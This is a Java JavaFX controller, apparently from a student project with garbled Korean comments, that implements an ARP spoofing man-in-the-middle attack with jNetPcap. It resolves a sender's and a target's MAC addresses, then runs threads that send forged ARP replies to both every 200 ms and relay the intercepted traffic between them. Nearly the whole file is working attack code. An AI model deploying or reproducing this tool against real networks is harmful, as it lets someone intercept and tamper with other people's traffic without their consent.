package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

//��ư �̺�Ʈ�� ó�����ִ� ��Ʈ�ѷ� ������ ����
//�̴ϼȶ������� ��ӹ���
public class Controller implements Initializable {
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	//��Ʈ��ũ ��ġ�� ���� �� �ִ� �迭����Ʈ�� ������
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	//�ʱ�ȭ �޼ҵ�
	public void initialize(URL location, ResourceBundle resources) {
		allDevs = new ArrayList<PcapIf>();
		//������ ���� ������ ���� 
		StringBuilder errbuf = new StringBuilder();
		//��ġ�� ã��
		int r= Pcap.findAllDevs(allDevs, errbuf);
		//��ġ�� ���ٸ�
		if (r==Pcap.NOT_OK || allDevs.isEmpty()) {
			// �ؽ�Ʈ ������ ���� ���ڸ� ���
			textArea.appendText("��Ʈ��ũ ��ġ�� ã�� �� �����ϴ�. \n" + errbuf.toString() + "\n");
			return;
		}
		//�� �Ʒ� �ؽ�Ʈ ������ ���ڸ� �������
		textArea.appendText("��Ʈ��ũ ��ġ�� ã�ҽ��ϴ�. \n���Ͻô� ��ġ�� �������ּ���. \n");
		//�ݺ����� �̿��ؼ� ��� ��ġ�� �ϳ��� �湮�ϸ鼭 ��ġ�� ���� ������ ���
		for(PcapIf device : allDevs) {
			networkList.add(device.getName() + " " +
		//����̽��� ������ �����ϸ� �����, ���ٸ� �������
					((device.getDescription()!=null)? device.getDescription():"���� ����"));
		}
		//��ġ�� ����Ʈ�� �߰��ؼ� ����ڿ��� ������
		networkListView.setItems(networkList);
	}
	
	//��ư �Լ�, �ϳ��� ��ġ�� ���� ������ ó��
	public void networkPickAction() {
		//�ε����� 0���� �۴ٸ� ���Ͻ�����
		//����ڰ� ��ġ�� ������ ����, ������ ���Ѵٸ� -1�� ��ȯ, �ߴٸ� �ε����� ���� 0���� 1�� ����
		//�� �Ʒ��� ����ó��
		if(networkListView.getSelectionModel().getSelectedIndex()<0) {
			return;
		}
		//ȭ�鿡�� ����ڰ� ������ ��ġ�� ������
		Main.device=allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		//������ ������ ������ �� �� ���� ��
		networkListView.setDisable(true);
		//��ư ���� ���̻� ������ ������ ��
		pickButton.setDisable((true));
		
		//��Ʈ��ũ ��� ���� ������ ������ TextArea��
		int snaplen = 64* 1024;
		int flags=Pcap.MODE_PROMISCUOUS;
		int timeout=1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap=Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if (Main.pcap==null) {
			textArea.appendText("��Ʈ��ũ ��ġ�� �� �� �����ϴ�.\n"+ errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("��ġ ���� : "+Main.device.getName()+"\n");
		textArea.appendText("��Ʈ��ũ ��� Ȱ��ȭ �Ͽ����ϴ�.\n");
	}
	
	public void getMACAction(){ //���ּҸ� ������ �� �ֵ���
		if(!pickButton.isDisable()) { //���� ��ġ�� �������� �ʾҴٸ� ����
			textArea.appendText("��Ʈ��ũ ��ġ�� ���� �������ּ���. \n");
			return;
		}
		
		ARP arp=new ARP(); //ARP ��ŶŬ������ ��ü�� ����, ARP.java���� ���� ARP���̺귯���� ������
		Ethernet eth=new Ethernet(); //Ethernet��ü
		PcapHeader header = new PcapHeader(JMemory.POINTER); //Pcap�� �̿��ؼ� ��Ŷ�� ����κи� ����
		JBuffer buf=new JBuffer(JMemory.POINTER);
		ByteBuffer buffer=null;
		
		int id=JRegistry.mapDLTToId(Main.pcap.datalink());
		
		//����ڷκ��� �Է¹��� ������ MAC�ּҸ� ����
		try {
			Main.myMAC=Main.device.getHardwareAddress(); //���� ���� ������ ��Ʈ��ũ�� �ϵ���� ����
			Main.myIP=InetAddress.getByName(myIP.getText()).getAddress(); //����ڰ� �Է��� IP�ּ�
			Main.senderIP=InetAddress.getByName(senderIP.getText()).getAddress(); //������ IP�ּ�
			Main.targetIP=InetAddress.getByName(targetIP.getText()).getAddress(); //������ IP�ּ�
		} catch (Exception e) {
			textArea.appendText("IP�ּҰ� �߸��Ǿ����ϴ�.\n");
			return;
		}
		//������ �� ����
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		//�������� MAC�ּҸ� ����
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.targetIP);
		//���� ������ ARP��Ŷ�� ����
		buffer=ByteBuffer.wrap(arp.getPacket());
		//������ ��Ŷ�� ����
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("Ÿ�ٿ��� ARP Request�� ���½��ϴ�.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long targetStartTime=System.currentTimeMillis(); //��û�� ���� ���� �ð��� ����
		
		Main.targetMAC=new byte[6]; //���� �ʱ�ȭ
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //��Ŷ�� ĸó�ؼ� �м�, ��Ŷ�� ĸó�ϴµ� ������ �߻����� ���� ��� ����ؼ� ĸó
			if (System.currentTimeMillis()-targetStartTime>=500) {
				textArea.appendText("Ÿ���� �������� �ʽ��ϴ�.\n");
				return;
			}
			PcapPacket packet=new PcapPacket(header, buf); //��Ŷ�� ��� PcapPacket
			packet.scan(id); //id�� �̿��� ĸó
			byte[] sourceIP=new byte[4]; //����Ʈ �迭 �Ҵ�, ������ ���� ����� ip�� Ȯ��
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4); //������ ĸó�� �����Ϳ��� ���� ��ŭ ����Ʈ �迭���·� �޾ƿ�
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06 // 12��° ����Ʈ�� 0x08, 13��° ����Ʈ�� 0x06���� Ȯ��, �� ARP��Ŷ���� Ȯ���� 20, 21��°�� ARP�� ������Ŷ���� Ȯ��
					&& packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP)) //���������� �� ��Ŷ�� ���� ip�ּҰ� Ÿ���� ip�� ���� Ȯ����
					&& packet.hasHeader(eth)) {//2���� ���ּҸ� ������ �ִ� ��Ŷ����
				Main.targetMAC=eth.source();
				break;
			} else {
				continue; //���� ���Ѱ�� ����ؼ� ĸó
			}
		}
		textArea.appendText("Ÿ�� �� �ּ�: " +
				Util.bytesToString(Main.targetMAC) +"\n");
		
		//����(������) ���ּҾ��
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.senderIP);
		//���� ������ ARP��Ŷ�� ����
		buffer=ByteBuffer.wrap(arp.getPacket());
		//������ ��Ŷ�� ����
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("�������� ARP Request�� ���½��ϴ�.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long senderStartTime=System.currentTimeMillis(); //��û�� ���� ���� �ð��� ����

		Main.senderMAC=new byte[6]; //���� �ʱ�ȭ
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) { //��Ŷ�� ĸó�ؼ� �м�, ��Ŷ�� ĸó�ϴµ� ������ �߻����� ���� ��� ����ؼ� ĸó
			if (System.currentTimeMillis()-senderStartTime>=500) {
				textArea.appendText("������ �������� �ʽ��ϴ�.\n");
				return;
			}
			PcapPacket packet=new PcapPacket(header, buf); //��Ŷ�� ��� PcapPacket
			packet.scan(id); //id�� �̿��� ĸó
			byte[] sourceIP=new byte[4]; //����Ʈ �迭 �Ҵ�, ������ ���� ����� ip�� Ȯ��
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4); //������ ĸó�� �����Ϳ��� ���� ��ŭ ����Ʈ �迭���·� �޾ƿ�
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06 // 12��° ����Ʈ�� 0x08, 13��° ����Ʈ�� 0x06���� Ȯ��, �� ARP��Ŷ���� Ȯ���� 20, 21��°�� ARP�� ������Ŷ���� Ȯ��
					&& packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP)) //���������� �� ��Ŷ�� ���� ip�ּҰ� Ÿ���� ip�� ���� Ȯ����
					&& packet.hasHeader(eth)) {//2���� ���ּҸ� ������ �ִ� ��Ŷ����
				Main.senderMAC=eth.source();
				break;
			} else {
				continue; //���� ���Ѱ�� ����ؼ� ĸó
			}
		}
		textArea.appendText("���� �� �ּ�: " +
				Util.bytesToString(Main.senderMAC) +"\n");
		
		//������ ��Ŷ�� ����
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
	}
	
	class SenderARPSpoofing extends Thread { //�۾��� �ݺ������� �ϴ� ���� ������
		@Override
		public void run() { //�����Լ�
			ARP arp=new ARP();
			arp.makeAPRReply(Main.senderMAC, Main.myMAC, Main.myMAC, //�����ڴܿ����� �������� ���ּҰ� ���� ���ּҰ� �� 
					Main.targetIP, Main.senderMAC, Main.senderIP); //��������ǻ�Ϳ��� 'Ÿ���� �������� ���ּҴ� ���� ���ּ��̴�.'
			Platform.runLater(()-> { //�並 ����
				textArea.appendText("�������� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�.");
			});
			while(true) { //����ؼ� ��Ŷ�� ������ �� �ֵ��� ����
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());//������ ����Ʈ �迭 ����
				Main.pcap.sendPacket(buffer); //��Ŷ ����
				try {
					Thread.sleep(200); //�����带 0.2�� �� ������
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread { //�۾��� �ݺ������� �ϴ� ���� ������
		@Override
		public void run() { //�����Լ�
			ARP arp=new ARP();
			arp.makeAPRReply(Main.targetMAC, Main.myMAC, Main.myMAC, 
					Main.senderIP, Main.targetMAC, Main.targetIP); 
			Platform.runLater(()-> { //�並 ����
				textArea.appendText("Ÿ�ٿ��� ������ ARP Reply ��Ŷ�� ����ؼ� �����մϴ�.");
			});
			while(true) { //����ؼ� ��Ŷ�� ������ �� �ֵ��� ����
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());//������ ����Ʈ �迭 ����
				Main.pcap.sendPacket(buffer); //��Ŷ ����
				try {
					Thread.sleep(200); //�����带 0.2�� �� ������
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class ARPRelay extends Thread {
		@Override
		public void run() {
			Ip4 ip=new Ip4();
			PcapHeader header=new PcapHeader(JMemory.POINTER);
			JBuffer buffer=new JBuffer(JMemory.POINTER);
			Platform.runLater(()-> { //�並 ����
				textArea.appendText("ARP Realy�� �����մϴ�.\n");
			});
			
			while(Main.pcap.nextEx(header, buffer)!=Pcap.NEXT_EX_NOT_OK) {
				PcapPacket packet=new PcapPacket(header, buffer);
				int id=JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				byte[] data=packet.getByteArray(0, packet.size()); //������ ĸó�� �� ��Ŷ ��ü
				byte[] tempD=new byte[6];
				byte[] tempS=new byte[6];
				
				System.arraycopy(data, 0, tempD, 0, 6);
				System.arraycopy(data, 6, tempS, 0, 6);
				//���� ��Ŷ���� ó��6����Ʈ�� tempD��, �� ���� 6����Ʈ�� tempS�� ������
				//�� tempD���� �������� MAC�ּ�, tempS���� �۽����� MAC�ּҰ� �����
				//12���� ����Ʈ�� �о ���ּҸ� �����
				
				//���� ���� ó����µ� ���ؾȰ�..
				if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.myMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myIP))) {
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				//�������� ������
				//�����ڷκ��� ���� ��Ŷ�� ����ͷ� ������
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.senderMAC))) {
					if(packet.hasHeader(ip)) {
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
					}
				}
				//����ͷκ��� ���� ��Ŷ�� �����ڷ� ������
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempS).equals(Util.bytesToString(Main.targetMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
							System.arraycopy(Main.senderMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				System.out.println(Util.bytesToString(buffer.getByteArray(0, buffer.size())));
			}
		}
	}
}
